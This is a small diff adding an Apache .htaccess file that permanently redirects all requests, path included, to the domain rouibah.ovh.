@@ -1,0 +1,5 @@
+RewriteEngine on
+RewriteBase /
+RewriteRule (.*) http://rouibah.ovh/$1 [R=301,L]
+
+
